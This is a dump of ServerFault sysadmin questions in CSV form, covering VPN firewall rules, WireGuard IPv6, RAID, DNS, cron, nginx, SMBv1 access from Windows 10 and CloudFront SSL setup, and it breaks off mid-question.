"876282","UFW rules for VPN","<p>I have set up a VPN box on my lan.</p>

<p>My lan gateway is 192.168.2.1. </p>

<p>I set port forwarding on my router to allow incoming VNP connections.
The VPN box LAN address is 192.168.2.42 </p>

<p>The tun0 interface that OpenVPN creates is 10.8.0.0/24</p>

<p>It all works just fine. Clinets are assigned fixed i/p addresses etc. </p>

<p><strong>But</strong> I want to restrict some (but not all) of my VPN clients from being able freely to access other machines on my LAN and accessing each other. </p>

<p>My plan is that there is only <strong>one</strong> machine on my LAN they should be allowed to have access to - but only to the NodeRed and MQTT ports (1880 / 1883). My desired VPN firewall blocks all other possibilities.</p>

<p>Let's say that this permitted LAN machine is 192.168.2.200</p>

<p>The VPN clients I wish to restrict in this way all all given i/p addresses 'upwards' from 10.8.0.20 - I can easily change these to whatever if that helps the UFW ruleset...</p>

<p>The VPN client that IS allowed to access my LAN entirely is 10.8.0.11 This 'favoured client' should also be able to access all the other VPN clients without restriction.</p>

<p><strong>Please can someone tell me the UFW ruleset that will achieve this?</strong> </p>

<p>I have tried many many options but apart from locking myself out a couple of times (!), I cannot prevent any machine in the VPN range from 'connecting back' through the VPN gateway to other machines on my LAN.</p>

<p>My suspicion is that I do not understand some NAT issue or other properly :(</p>

<p>Thanks in advance...</p>
","<vpn><ufw>","2017-09-30 15:53:26"
"876342","DNS hosting design - should secondary server not be spread over countries, networks etc?","<p>My DNS registrar and DNS provider recently had a long outage, rendering all my domains unusable (email, own+client websites etc).</p>

<p>They have 3 DNS server, who are all in the same co-hosting facility!</p>

<p>I know just enough about networking to make my spidey-sense supertingle, but not enough to condemn this. Is that not an atrocious design? </p>

<p>Should they not have been spread across lines, networks - even continents?</p>

<p><a href=""https://i.sstatic.net/nPQaw.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/nPQaw.png"" alt=""enter image description here""></a></p>

<p>(Source: <a href=""https://help.hover.com/hc/en-us/community/posts/115007805527-After-recent-outage-what-are-you-going-to-do-to-fix-your-network-design-problems-"" rel=""nofollow noreferrer"">https://help.hover.com/hc/en-us/community/posts/115007805527-After-recent-outage-what-are-you-going-to-do-to-fix-your-network-design-problems-</a>)</p>
","<domain-name-system><redundancy>","2017-10-01 09:45:13"
"876406","Kubernetes ImagePullBackOff caused by no space left on device","<p>I have this weird error on my Kubernetes test cluster. I'm running Kubernetes 1.7.0 and docker <code>Docker version 1.12.6, build 78d1802</code></p>

<p>I have a separate volume mounted as <code>/dockerdata</code> and symlinked <code>/var/lib/docker</code> into this volume. I have ample space available on both my system volume and the dockerdata volume (more than 50% free). I still get ImagePullBackOff errors from kubernetes, the detailed error is:</p>

<p><code>Failed to pull image ""&lt;redacted&gt;"": rpc error: code = 2 desc = failed to register layer: ApplyLayer exit status 1 stdout:  stderr: open /usr/share/man/es/man1/fakeroot-sysv.1.gz: no space left on device.</code></p>

<p>If I manually clean up by removing stale images I can get around this, but as far as I can see I shouldn't have to - since none of my volumes are nearing full capacity (which I guess is also why the Kubernetes GC doesn't kick in).</p>

<p>I'm guessing there's something I don't understand about how Docker works in relation to local disks but I'm stumped. Any pointers appreciated.</p>

<p>Here's some more info:
symlink info:</p>

<p><code>
file /var/lib/docker
/var/lib/docker: symbolic link to /dockerdata
</code></p>

<p><code>
df
Filesystem     1K-blocks     Used Available Use% Mounted on
udev             2014736        0   2014736   0% /dev
tmpfs             404520    44628    359892  12% /run
/dev/xvda1      20263528  4121240  16125904  21% /
tmpfs            2022600        0   2022600   0% /dev/shm
tmpfs               5120        0      5120   0% /run/lock
tmpfs            2022600        0   2022600   0% /sys/fs/cgroup
/dev/xvdb       51475068 18385324  30451920  38% /dockerdata
tmpfs             404520        0    404520   0% /run/user/1000
</code></p>

<p><code>
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.2 LTS
Release:    16.04
Codename:   xenial
</code></p>
","<docker><kubernetes>","2017-10-02 07:27:38"
"997398","Error accessing a local Web Server from Internet","<p>I have installed xampp web server in a windows 10 Virtual Machine.
I have checked that the server is accesible from the localhost
I have downloaded the NoIP software to refresh the ip.
Then i have tried to access the web server using the NoIP provided by NoIP but it doesn't work, it says: ""<a href=""http://192.168.0.1/interception.html"" rel=""nofollow noreferrer"">http://192.168.0.1/interception.html</a> There is no Internet connection""
My Internet Provider is Vodafone.
The Apache ports are 80 and 443.</p>

<p>Any help will be appreciated.</p>
","<port-forwarding><xampp>","2020-01-02 18:58:11"
"786827","How to backup all the iso and config files","<p>We have:
Existing Spec:
Model: HP Proliant DL380p Gen 8 Server
Processor: 2 x Intel® Xeon® E5-2650 v2 (2.6GHz/8-core)
Memory: 32GB (2 x 16GB)
HDD: 1TB SAS Hot-Plug HDD</p>

<p>We are Upgrading it to:
Memory: 32GB (2 x 16GB)
HDD: 1TB SAS Hot-Plug HDD</p>

<p>Now, my question is how can i backup all the files and data that is already in the single hard disk. We want to add the hard disk and still make it in RAID 0. 
I read somewhere that if we don't have L3 cache, we can't add a new hard disk to existing config online. Is it true?</p>

<p>We are running EXSI and there are 4 clients running now. </p>

<p>What i need is i want to add the new hard drive, increase the memory and i don't want my data to get lost. 
Please help. </p>
","<backup><hp>","2016-06-29 04:43:04"
"997553","Multiple RAIDS on same disks","<p>On a server, I have 3 SATA disks.</p>

<p>I'd like to create a root partition in RAID 1 of 50GB and a data partition in RAID 5 with the remaining spaces on my disks.</p>

<p>There would be 2 different RAID types on the same disks.</p>

<p>Would it be an issue if one of the disks fails? Is it better not to mix RAID types on the same disks ?</p>
","<raid><raid5><raid1>","2020-01-03 19:45:21"
"876641","Exchange 2016 Installation issue","<p>We’ve been using NethServer for quite a while but our company keeps growing and the decision was made to switch to Exchange for mailing due to seamless administration and better AD integration. </p>

<p>I’ve been following this guide <a href=""https://www.starwindsoftware.com/blog/exchange-server-2016-on-windows-server-2016-with-gui"" rel=""nofollow noreferrer"">https://www.starwindsoftware.com/blog/exchange-server-2016-on-windows-server-2016-with-gui</a> which is great but after installation finishes successfully I am not able to access <a href=""https://myserverFQDN/ECP"" rel=""nofollow noreferrer"">https://myserverFQDN/ECP</a> address getting “This site can’t be reached”. Looks like some services are not running after installation. </p>

<p>What do I have to check?</p>
","<exchange><windows-server-2016><exchange-2016>","2017-10-03 14:01:16"
"787022","web program today: why is online web program user =/= Unix user in /etc/passwd","<h1>History and explanation</h1>

<h2>In the early days of Unix,</h2>

<p>... as Unix was invented as a network and multi-user operating system; you could deploy web server programs on Unix where the online user in the program was the same as (equaled) the actual user (registered in /etc/passwd with a number higher than 1000) on the Unix machine (correct me if I am wrong). </p>

<h2>Nowadays,</h2>

<p>...this is mostly not the case anymore. Today, every web server program, which wants to be for multiple online users, also includes multi-user support written in the same program. The web server program then only runs under <strong>one</strong> user, normally this user is called the same as the program (e.g. Apache may be deployed under the user apache or www-data). </p>

<h1>Comparison</h1>

<h2>Disadvantages of today's normal setup</h2>

<ul>
<li>administration is mostly only possible via the web server program (either CLI, GUI or conf files). <br/></li>
<li>I would say, administration gets a little bit more complicated and intransparent. Because by limiting it only to one user; but then creating multiple users <strong>inside</strong> the application / the applications home directory; the whole concept of multi-user operating system is misused in my perception. Isn't it better it to use things like SELinux or limiting access rights by putting those peoples in system groups:
You could for example put all online users in a system group called online-users. 
Then you could deny all members of this group to execute any program on your server, except of the web server programs that you configured before. This would also make sharing data between multiple web server applications on the same server much easier. <br/></li>
<li>Every programmer, who wants to make an online web-server program; also has to program the multi-user support and harden each user from each other, so that no user can get access to other users data or passwords => double work! </li>
<li>This way, online users (inside the web server application) vs system users on the server are protected very good; but the online-user-vs.-online-user-protection level on the same server depends on the programming skills of the web program programmer.</li>
</ul>

<h2>Advantages of today's normal setup:</h2>

<ul>
<li><strong>more security</strong>: by limiting <strong>all</strong> online action and data to only one user (so to say: sandboxing) who has got <strong>no</strong> root/sudo rights and only ONE program (without SUID bit, of course).</li>
<li><strong>portability:</strong> the web server program can also be used on non-unix systems. But come on: Windows or Mac OS X Servers are rarely used as web server operating systems; that is not a really big advantage. </li>
</ul>

<p><br/>
Are there any more advantages? If this is the only advantage (I don't count the second one as relevant ...), I would count this whole thing as a good example where security was more important than usability / comprehensibility / transparency. </p>

<p>Apart from that, I think there are more advantages I did not mention.
<br/>
<br/>
I guess you understand what I mean; and I do not have to provide examples. If you do not not understand what I mean to say, I can give some examples. </p>

<p><br/>
<br/></p>

<h1>TL;DR:</h1>

<p>Why does no web program (for POSIX-based-OS) exist anymore today; in which: <br/> 
<strong>online user</strong>, registered with web program == <strong>system user</strong>, registered in /etc/passwd with a number > 1000.<br/>
What are the advantages and disadvantages with each setup (setup today: =/=, possible setup: ==)? 
<br/>
<br/>
I could not find any website or other serverfault question dealing with this matter more than incidentally in a sub-ordinate clause, if you know one website or question; please let me know. </p>
","<linux><unix><authentication><users>","2016-06-29 21:34:38"
"876687","How to access home-built server with ILO","<p>I have used ILO ports before but have recently built a home server that I want to access using ILO ports, is this possible? If so do I need to just find one that plugs in or is there special ones for this use case?</p>
","<hp><remote-access><ilo>","2017-10-03 18:03:52"
"876698","What's the difference in localhost vs 0.0.0.0?","<p>What's the difference in telling a service to run on <code>localhost:xxxx</code>, <code>127.0.0.1:xxxx</code> and <code>0.0.0.0:xxxx</code>?</p>

<p>I needed to use <code>0.0.0.0</code> to get another host to be able to connect to my service.</p>
","<linux>","2017-10-03 19:56:43"
"997642","How to set up a wireguard IPv4 to IPv6 VPN?","<p>My ISP currently does not support IPv6, and I'm trying to set up a way for all of my computers at home to have a public IPv6 address range. </p>

<p>I've been following a <a href=""https://angristan.xyz/how-to-setup-vpn-server-wireguard-nat-ipv6/"" rel=""nofollow noreferrer"">guide</a> on getting wireguard set up, and I'm able to get an IPv4 VPN set up. However for some reason I can't figure out how to assign peers a public IPv6 range. </p>

<p>Here is my server's wg.conf. I'm not the greatest at iptables, but I commented out the ip6tables command because I don't want the address to be translated: </p>

<pre><code>[interface]
ListenPort = 1194
PrivateKey = AMUT1f04Ej4gBquVz9xw/r0jdUFBVDBFCsdNxO0pFXY=
# PostUp = iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE; ip6tables -t nat -A POSTROUTING -o ens3 -j MASQUERADE
PostUp = iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE
# PostDown = iptables -t nat -D POSTROUTING -o ens3 -j MASQUERADE; ip6tables -t nat -D POSTROUTING -o ens3 -j MASQUERADE
PostDown = iptables -t nat -D POSTROUTING -o ens3 -j MASQUERADE

[Peer]
PublicKey = YNOhDK0kllJEuGIScYpKbvKVBhRiHdo23UB4ydrk7wg=
AllowedIPs = 10.66.66.3/32,&lt;Public IPv6&gt;::56/128
</code></pre>

<p>Here is my client's wg.conf:</p>

<pre><code>[Interface]
PrivateKey = KJITzQmb8xdQNMw1FLEzAXrEee4khKNssgGlgVN1CmY=
Address = 10.66.66.3/24,&lt;Public IPv6&gt;::56/128

[Peer]
PublicKey = nXWR6FfgzIh7HfNaQE/91X6rSlQLLrfYvvzgE4grvwA=
Endpoint = &lt;Public IPv4&gt;:1194
AllowedIPs = 0.0.0.0/0,::/0
</code></pre>

<p>Also here is my VPS's ifconfig output:</p>

<pre><code># ifconfig
ens3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet &lt;Public IPv4&gt;  netmask 255.255.255.255  broadcast 0.0.0.0
        inet6 fe80::f816:3eff:feb1:1c0  prefixlen 64  scopeid 0x20&lt;link&gt;
        inet6 &lt;Public IPv6&gt;::55  prefixlen 64  scopeid 0x0&lt;global&gt;
        ether fa:16:3e:b1:01:c0  txqueuelen 1000  (Ethernet)
        RX packets 76989  bytes 14208737 (14.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 69678  bytes 13847183 (13.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>

<p>With the above configuration my IPv4 traffic gets tunneled just fine, but nothing on IPv6</p>

<p>Other solutions I've tried but aren't quite what I need: </p>

<ul>
<li>IPv6 Tunnel Broker: Slows my internet speed way down when active.</li>
<li>VPN: Only allocates one IPv6 address per device, I need a range.</li>
</ul>

<p>Thanks!</p>
","<iptables><vpn><ipv6><wireguard>","2020-01-04 21:49:46"
"997718","Ethernet Cable Broken","<p>Hi I have a 15m ethernet cable going under my floor from the front to back of house.
It has developed a fault and pins 1 &amp; 6 are no longer connected (I've tested it).</p>

<p>Given getting it back up or laying a replacement is impossible due to flooring laid since, is there a way I could utilise the remaining strands that do work?
I've read some strands are not used but would like some advice on the pros/cons of this, obviously i'd end up breaking convention with wiring colours.</p>

<p>Thank you</p>
","<ethernet><cable>","2020-01-05 20:51:32"
"787263","Redirect IP adress to default domain name","<p>I'm running VPS with multiple domains.</p>

<p>When I type IP of my sever into browser, I want visitors to be redirected to specified domain name.</p>

<p>It is possible? Now it shows Default Debain Apache2 page.</p>

<p>Thank you</p>
","<apache-2.2><domain-name-system>","2016-06-30 21:24:17"
"997771","Crontab -e with Debian Buster not working","<p>I want to run a cron every 5 minutes on Debian Buster.</p>

<p>My steps:</p>

<pre><code>crontab -e
*/5 * * * * /usr/local/bin/squid-analyzer &gt; /dev/null 2&gt;&amp;1
sudo service cron reload
</code></pre>

<p>Unfortunately this entry has no effect.</p>

<pre><code>tail /var/log/syslog -f
</code></pre>

<p>The Command seems to be executed. Output:</p>

<pre><code>Jan  6 12:20:01 CRON[8290]: (root) CMD (/usr/local/bin/squid-analyzer &gt; /dev/null 2&gt;&amp;1)
</code></pre>

<p>The Website is not updated. Executing the Script manual in the bash works fine.</p>

<p>Playing around with varibales in my crontab like this has no impact:</p>

<pre><code>HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
#!/usr/bin/env bash
PWD=/root
</code></pre>

<p>Help is very appreachiated!</p>
","<cron><debian-buster>","2020-01-06 11:22:14"
"787310","How can I handle heavy Database interaction at peak hours?","<p>We run an application more like competition organizing websites like <a href=""http://www.hackerearth.com"" rel=""nofollow noreferrer"">HackerEarth.com</a>, <a href=""http://www.hackerrank.com"" rel=""nofollow noreferrer"">HackerRank.com</a>. When the tasks start, we see huge load on our server. The problem is, we need to interact with Postgres heavily in order to give random questions and then submitting their answers. There are JOINS between multiple tables and searching and other things, which results in a lot of data traffic and it makes our system slow and unresponsive many times, which is embarrassing.</p>

<p>What can we do in order to make it better? How to handle things which interacts a lot with RDBMS, any caching or in-memory database usage. I searched a lot over various sources, but couldn't find concrete solutions for our needs. How companies organise database and user interactions? What are some good architectures for models like these? Any insight would be helpful.</p>
","<linux><ubuntu><memory-usage><high-load><rdbms>","2016-07-01 06:04:34"
"876993","Reverse proxy FTP traffic to Docker containers based on hostaname?","<p>Is there any way to reverse proxy FTP (or SFTP) connections as you can do with HTTP traffic? I already have working setup fot HTTP connections with <a href=""https://github.com/jwilder/nginx-proxy"" rel=""nofollow noreferrer"">nginx-proxy</a> and I was wondering if I can route the FTP connections in similar way:</p>

<pre><code>User connects ftp.domain1.com --&gt; FTP proxy --&gt; container1 (with -e HOST=ftp.domain1.com)
User connects ftp.domain2.com --&gt; FTP proxy --&gt; container2 (with -e HOST=ftp.domain2.com)
</code></pre>

<p>And both of the containers are running in the same machine and have the same IP address.</p>
","<ftp><reverse-proxy><docker>","2017-10-05 08:54:11"
"877112","am I tracking Debian Stable or Testing?","<p>When I installed Debian, I clearly wanted to track Testing. a bit after that though, I installed Firefox from the unstable repo, not thinking too much :) I wonder if I am tracking unstable or testing now (I started having a few problems with my install, this is why I am asking). The following is the current content of my  <code>/etc/apt/rsources.list</code>:</p>

<pre><code># Debian testing repo
deb http://debian.ludost.net/debian/ testing main contrib non-free
deb-src http://debian.ludost.net/debian/ testing main contrib non-free

# Debian testing security repo
deb http://security.debian.org/debian-security testing/updates main contrib non-free
deb-src http://security.debian.org/debian-security testing/updates main contrib non-free

#Mozilla repo
deb http://http.debian.net/debian unstable main

# Opera repo
deb http://deb.opera.com/opera-stable/ stable non-free
</code></pre>

<p>What do you guys think?</p>

<p>Cheers,
H.</p>
","<linux><debian>","2017-10-05 18:28:58"
"997941","What is the difference between a published and verified oauth app?","<p>We have an OAuth app to get Youtube Analytics Reports for our users, our app status is ""Published"", but when a user tried to sign in he gets that our app is not verified.</p>

<p><a href=""https://i.sstatic.net/eNf4V.png"" rel=""nofollow noreferrer"">Message shown to users</a></p>

<p>Is there a difference between a published app and a verified one? if there how do we get our app verified after\before it gets published?</p>

<p>Thanks</p>
","<google-cloud-platform><oauth>","2020-01-07 14:17:57"
"997961","Nginx doesn't forward the OPTIONS request to application","<p>I have an Nginx server and a PHP application running in PHP-FPM. The application is restful API. The problem is I get OPTIONS request which the application understands and supports, but the server blocks the request which never gets to the application and just displays HTML 405 Error.</p>

<p>Is there some directive to make Nginx serve OPTIONS the same way it serves other methods?</p>

<p>I found many tutorials to enable a response to OPTIONS directly from the Nginx but it doesn't solve my problem as only the application knows which methods are allowed for the URL.</p>

<p>Or am I missing something?</p>
","<nginx><http><cors>","2020-01-07 15:52:14"
"787529","What to do to enable SSH service on CentOS hosted in local Hyper-V?","<p>I googled a lot but didn't help. So, I have another PC in my local network that has Windows Server 2012 R2. I enabled Hyper-V and initiated CentOS 7.2 and configured SSH server. The thing is I want to be able to connect to CentOS through my local network. Disregarding every guides resides in web, what steps should I take to accomplish that? I already tried creating an Internal Switch in Hyper-V and used the command below but didn't help:</p>

<pre><code>netsh interface portproxy add v4tov4 listenport=8080 connectaddress=192.168.0.100 connectport=8080 protocol=tcp
</code></pre>
","<hyper-v><nat>","2016-07-02 09:21:04"
"997985","new admin wondering why htop and top show different numbers on scientific linux VM","<p>I am trying to figure out if I am using htop correctly.  A top on this VM reveals:</p>

<pre><code>top - 17:52:39 up 98 days, 23:05,  1 user,  load average: 0.04, 0.01, 0.00
Tasks: 178 total,   1 running, 177 sleeping,   0 stopped,   0 zombie
Cpu(s):  0.1%us,  0.0%sy,  0.0%ni,  0.9%id,  0.0%wa,  0.0%hi,  0.1%si, 98.9%st
Mem:   7025100k total,  2956284k used,  4068816k free,    12276k buffers
Swap:  8191992k total,   729080k used,  7462912k free,  1756724k cached

  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND           
25778 manga     20   0 1052m 228m 3228 S  1.3  3.3 959:15.39 python             
26343 manga     20   0 1054m 231m 3208 S  1.0  3.4 938:22.52 python             
25712 manga     20   0  988m 225m 3208 S  0.7  3.3 948:48.92 python             
26316 manga     20   0 1054m 234m 3200 S  0.7  3.4 930:13.21 python             
15500 root      20   0  102m 4664 3612 S  0.3  0.1   0:01.12 sshd               
    1 root      20   0 19360  652  420 S  0.0  0.0   0:04.22 init               
    2 root      20   0     0    0    0 S  0.0  0.0   0:30.26 kthreadd           
    3 root      RT   0     0    0    0 S  0.0  0.0  18:54.61 migration/0  
.... etc ...
</code></pre>

<p>While an HTOP on the same machine shows what looks to be maxed out CPUs?</p>

<p><a href=""https://i.sstatic.net/yclr0.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/yclr0.png"" alt=""enter image description here""></a></p>

<p>Am I reading this right?  Or is it reversed and that is how 'free' the cpus are?</p>
","<centos><kvm-virtualization><scientific-linux><htop>","2020-01-07 17:54:11"
"877201","Limit access to remote server via particular vpn","<p>I need to ask a question.</p>

<ol>
<li>there are multiple users of server, all connecting via vpn.</li>
<li>each using openvpn-cert based connection (linux)</li>
</ol>

<p>I'd like to find a way to limit vpn connection to ""trusted"" devices only, added to the server and prevent to log in from the other devices.
The point is to have a better control of logging.</p>
","<vpn><remote-access><remote>","2017-10-06 08:40:43"
"787574","Cloudflare or Apache vhost misconfiguration?","<p>I have setup a website in cloudflare that pointing website3.com to xxx.xxx.xxx.xxx IP address.</p>

<p>In my apache, I have existing website1.com and website2.com vhost (website 1 and 2 are using digital ocean DNS). I created a new vhost for website3.</p>

<p>But when I go to website3.com, It is showing the content of website1. This is probably because when I type the IP in the browser, it lead to website1.</p>

<p>Why is my website3 not using the vhost I have created?</p>
","<apache-2.2><cdn><cloudflare>","2016-07-02 18:36:32"
"998045","Sending files from win10 to SMBv1 server?","<p>Is it possible to only send files from a win10 machine (A), patched to disable <code>SMBv1/CIFS client</code> with 1803, to a very old device (B) using passwordless SMBv1 (strictly)?</p>

<p>I was thinking along the lines of <code>smbclient</code> or <code>curl</code> or some other smb-capable file-transfer (open source) application for win10.</p>

<p>Will I need special privileges on computer A? Firewall? I do not want to tick the dreaded ""Enable SMBv1/CIFS client"" tickbox as this, as  I understand it, will leave the machine exposed again to WannaCry.</p>

<p>If this is not possible or security risks are high can I setup a linux box to send the files instead of the win10? The other side (B) can not be upgraded. It is strictly SMBv1 passwordless.</p>
","<windows-10><server-message-block><smbclient>","2020-01-08 00:40:24"
"787592","Run 64bit installer on 32bit centos cannot execute binary file","<p>I Have a 64bit file from my old server, its ./install file</p>

<p>now i want run it in 32bit server, see below error:</p>

<pre><code>[root@host ~]# ./installer.1
-bash: ./installer.1: cannot execute binary file
</code></pre>

<p>My server is centos</p>
","<linux><centos><unix><vps><64-bit>","2016-07-02 22:39:20"
"998081","How can HTTP work over UDP (in the case of Google's QUIC protocol)?","<p>Here is my understanding of how a client-server HTTP server works.</p>

<ol>
<li>The client creates a <strong>TCP</strong> socket connection to connect to the server and sends data.</li>
<li>The server creates a <strong>TCP</strong> socket connection to listen for incoming requests.</li>
</ol>

<p>So it looks like both the client and the server need to agree on the use of the <code>Transport protocol</code> to use (in this case TCP). But if we want a website to work over UDP/QUIC protocol then we need both the client and the server to create a <strong>UDP</strong> socket connection. <em>But some websites use TCP and others use UDP...</em></p>

<p>So does it mean it would need to look like this?</p>

<pre><code>if (URI == 'https://www.google.com') {
  // Website that works over UDP
  client.create.UDP.socket
  client.sendData

  server.create.UDP.socket
  server.receive.data
} else {
  // Website that works over TCP
  client.create.TCP.socket
  client.sendData

  server.create.TCP.socket
  server.receive.data
}
</code></pre>

<p>So the client needs to keep a record of which website uses TCP and which websites use UDP/QUIC and create that kind of socket to communicate with it?</p>
","<web-server><http><tcp><socket><udp>","2020-01-08 10:09:14"
"787634","Remove ""OneDrive"" from path in onedrive folder","<p>I'm trying to setup a simple backup solution for a small office of a few people. We have a windows server with two disks in Raid 1 (mirrored) for saving files that can be reached both in office and from outside through a VPN. This folder is located at <code>V:\Vault</code>. </p>

<p>As an extra precation in case of robbery or fire we are thinking of saving the contents of this folder to OneDrive (as we are using it for other things already anyways). </p>

<p>Here comes the problem. Onedrive apparently requires you to put all your files in a folder path which ends in OneDrive, ie <code>""V:\Vault\OneDrive""</code>. Even if you select a different location it automatically adds the ""OneDrive"" part to the end.</p>

<p>My question: Is there a way to get around this so that the onedrive folder is simply V:\Vault through some setting or other trikkery. I'm fine with regedit changes if it can be accomplished that way.</p>

<p>I would prefer not to change the folder structure/path because OneDrive has stupid settings/requirements.</p>
","<windows><backup>","2016-07-03 11:19:21"
"787649","HP ProLiant DL360 G5 - no post, no beeps","<p>since i'm a total ""server stuff"" beginner i decided to get started with a used server so i got an HP ProLiant DL360 Gen 5.</p>

<p>I plugged the power cables, keyboard, mouse and a VGA monitor and turned it on just to realize it can't POST, it stays in a situation with fans spinning at 100%. No beeps either.</p>

<p>At first i had problems with ILO too, i used the reset switch to reset the configuration. Now i can log in to ilo but it does not help, system health is ""ok"" but the system is still in the 100% fan speed and no post.</p>

<p>I'm doing this tests with no HD, DVD, minimum RAM and power supply.</p>

<p>Any suggestions?</p>
","<hp-proliant>","2016-07-03 14:34:27"
"787688","What are the advantages of using AWS Elastic Transcoder (for WAV to AAC) vs Lambda and ffmpeg?","<p>I did a price comparison between using Elastic Transcoder vs Lambda for WAV-to-AAC conversion. I have to say, AWS ET is significantly pricier than Lambda.</p>

<p>A 9-minute audio file transcoded using ET: $0.04
The same file transcoded on a 1536MB Lambda instance (33sec runtime, excluding free tier): $0.0000002 for the request, and $0.000825165 for the execution time.</p>

<p>Granted, the Lambda transcoding took 33 seconds, and the same job on ET took probably around a third of that. But the cost of ET just doesn't make sense to me. Am I missing something else here? I should add that these transcodings are user-invoked by an upload (similar to how SoundCloud takes uploaded audio and transcodes to MP3), I'm not sending batch jobs. So maybe ET isn't the right application for my use case.</p>
","<amazon-web-services><transcoding><amazon-lambda>","2016-07-03 20:08:09"
"998171","msdos 6.22: troubleshoot net share","<p>The short question is how to check that a networked DOS6 (MS-DOS 6.22) machine loads its network and its shared drives OK. Both from within that machine and from another modern laptop (OSX or linux or ... windows-10) within the same intranet.</p>

<p>Here are the details:</p>

<p>I have an industrial machinery which is controlled by a PC with MS-DOS 6.22. `MS Network Client` is used to provide network capabilities such as shared drives. This machine is in the intranet with lots of windows-10 and my osx 10.8 laptop which I use to test as I do not want to mess with the office machines.</p>

<p>Communication (i.e. sending files) with the machine was via shared network drives from a windows 10 computer. It uses SMBv1 without passwords. That no longer works.</p>

<p>The DOS6 machine had `net share test=c:\test /full /yes` and the WIN10 would drop files onto that (i guess mapping was via `net use \\DOS6\test`). After April/2018 and MS windows-10 update 1803, this stopped working from WIN10 machine because SMBv1 is now disabled by default. Fine. Because the administrator does not want to enable SMBv1 I am seeking an alternative and right now I am trying to connect to DOS6 using `smbclient` in OSX 10.8. But this fails and I am trying to troubleshoot. But I do not know how.</p>

<p>Remotely it does ping. Also, by using `nmap` I found out that port 139 is opened (NetBIOS) but port 445 (SMB) is closed (after checking locally and `net share` reports shared drives available.</p>

<p>I have also observed that after an `nmap` from within the same intranet, the DOS6 machine no longer pings. Could that mean a weird intranet wide/router/hardware firewall is blocking it? Can it be that DOS6 network stack crashes from `nmap`? How can I troubleshoot the latter? How can I see that the network drivers are alive and loaded. How can I see what ports DOS6 machine exposes from within it? How can I verify locally that it does share a drive.</p>
","<network-share><server-message-block><ms-dos>","2020-01-08 19:42:18"
"877387","DiG returns wrong DNS but apparently only on my network","<p>i'm asking this question cause something a bit odd is going on, i changed the DNS on my domain to point to digitalocean's nameservers, i created a domain on DigitalOcean as well with the same name and set it to point to my Droplet, and after giving it about 30 minutes to propagate i checked with DiG to see if the domain was pointing to my server as expected.</p>

<p>Somehow it still points to the wrong IP, so i checked using <code>dig @8.8.8.8</code> instead of just <code>dig</code> and it shows me the correct IP i was expecting, any whois tool online returns the correct droplet IP address for my domain, but for some reason it seems that in my network it's returning the wrong one.</p>

<p><code>dig +trace +additional salesonline.pt</code></p>

<p>trying to show a full trace returns only the following information</p>

<pre><code>; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; +trace +additional salesonline.pt
;; global options: +cmd
;; Received 12 bytes from 192.168.1.254#53(192.168.1.254) in 22 ms
</code></pre>
","<domain-name-system>","2017-10-07 19:56:03"
"787825","Strange file appeared in my public_html","<p>I was sending some files through FileZilla to my site when I noticed this strangely named file:</p>

<pre><code>\002\217a\333\\rb\004ݠ\025H\214d\277\\Z\304H\3328\f#\3641\ \tFA\001\\Z\272r\ \021\340\@\263\&gt;\210\234\301\376\@\312!\373爬F\323\a\3729hN~\005\036î\002]\316H\263\335ˊ\354\237#v\335_\313\|\264\266#+\205\266\320\375\\n&lt;\&gt;m\a\&gt;\353\017\263g3*
</code></pre>

<p>Owned by root and with all permissions (-rwsrwsrwt). 
I am a little bit worried, does anybody know what can it be?</p>
","<linux><files>","2016-07-04 14:01:17"
"877397","Can't Connect To Wordpress on EC2 With Cloudfront and SSL","<ul>
<li>I have instantaudiobook.co registered at Name Cheap and pointing to AWS
Route 53. </li>
<li>I have CloudFront in front of my AWS server (just running<br>
WordPress).</li>
<li>I created an SSL cert in AWS Certificate Manager and associated it with my domain via CloudFront.</li>
<li>When I try to access my domain, I get various errors: </li>
</ul>

<p><strong>Regular HTTP Request To My Domain:</strong></p>

<p>I get a Bad Request/403 error.</p>

<p><a href=""https://i.sstatic.net/STONX.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/STONX.png"" alt=""enter image description here""></a></p>

<p><strong>Request To The Cloudfront Domain</strong></p>

<p>I get the same 403 error. </p>

<p><a href=""https://i.sstatic.net/ZtOEh.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/ZtOEh.png"" alt=""enter image description here""></a></p>

<p><strong>HTTPS Request To My Domain</strong></p>

<p>Sometimes I get the same 403 errors. And sometimes I get an Unsupported Protocol error.</p>

<p><a href=""https://i.sstatic.net/7KyEb.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/7KyEb.png"" alt=""enter image description here""></a></p>

<ul>
<li>Based on the SSL certs in Chrome and Safari, the certificate looks OK:</li>
</ul>

<p><a href=""https://i.sstatic.net/JdQHP.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/JdQHP.png"" alt=""enter image description here""></a>
<a href=""https://i.sstatic.net/XEtOo.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/XEtOo.png"" alt=""enter image description here""></a></p>

<ul>
<li><p>Certificate Manager Setup:
<a href=""https://i.sstatic.net/nqScH.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/nqScH.png"" alt=""enter image description here""></a></p>

<ul>
<li>Route 53 DNS Setup:</li>
</ul></li>
</ul>

<p><a href=""https://i.sstatic.net/EChnT.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/EChnT.png"" alt=""enter image description here""></a></p>

<ul>
<li>ec2 setup:</li>
</ul>

<p><a href=""https://i.sstatic.net/vH0Hc.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/vH0Hc.png"" alt=""enter image description here""></a></p>

<ul>
<li>CloudFront Setup:
